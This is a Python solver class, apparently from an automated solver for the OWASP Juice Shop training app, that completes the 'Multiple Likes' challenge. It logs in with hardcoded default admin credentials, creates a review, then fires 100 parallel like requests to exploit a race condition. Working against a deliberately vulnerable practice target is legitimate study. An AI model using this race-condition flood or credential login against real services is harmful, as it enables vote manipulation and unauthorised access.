from core.base_solver import BaseSolver
import threading
from loguru import logger

class MultipleLikesSolver(BaseSolver):
    """
    Challenge: Multiple Likes (timingAttackChallenge) - actually "timingAttack" is the key?
    Wait, in challenges.yml:
    name: 'Multiple Likes'
    key: timingAttackChallenge
    
    Logic: Race condition. Submit multiple "Like" requests for the same review 
    simultaneously from the same user.
    """
    @property
    def challenge_key(self) -> str:
        return "timingAttackChallenge"

    def solve(self) -> bool:
        # 1. Login
        login_res = self.client.post("/rest/user/login", json={"email": "admin@juice-sh.op", "password": "admin123"})
        token = login_res.json().get("authentication", {}).get("token")
        headers = {"Authorization": f"Bearer {token}"}
        
        # 2. Create a NEW review to ensure race condition window is open
        msg = f"Loved it! {threading.get_ident()}"
        self.client.put("/rest/products/1/reviews", json={"message": msg, "author": "admin@juice-sh.op"}, headers=headers)
        
        # Find the ID of the review we just created
        res = self.client.get("/rest/products/1/reviews")
        reviews = [r for r in res.json().get("data", []) if r.get("message") == msg]
        
        if not reviews:
            logger.error("Failed to find created review")
            return False
            
        review_id = reviews[0].get("_id")
        logger.info(f"Targeting NEW review: {review_id}")
        
        # 3. Bombard with Like requests
        # POST /rest/products/reviews/{review_id}/like
        
        from concurrent.futures import ThreadPoolExecutor
        import requests
        from requests.adapters import HTTPAdapter
        from urllib3.util.retry import Retry

        # Setup session with high connection pool
        session = requests.Session()
        adapter = HTTPAdapter(pool_connections=100, pool_maxsize=100)
        session.mount('http://', adapter)
        
        results = []
        def like():
            try:
                r = session.post(f"{self.client.base_url}/rest/products/reviews", 
                                 json={"id": review_id}, 
                                 headers=headers, 
                                 timeout=5)
                results.append(r.status_code)
            except Exception as e:
                results.append(str(e))
            
        logger.info("Firing 100 parallel requests...")
        with ThreadPoolExecutor(max_workers=100) as executor:
            for _ in range(100):
                executor.submit(like)
            
        logger.info(f"Requests finished. Success count: {results.count(200)}")
        logger.info(f"Results summary: {set(results)}")
        
        # Trigger verification
        self.client.get("/rest/products/search?q=")
        
        return results.count(200) > 2

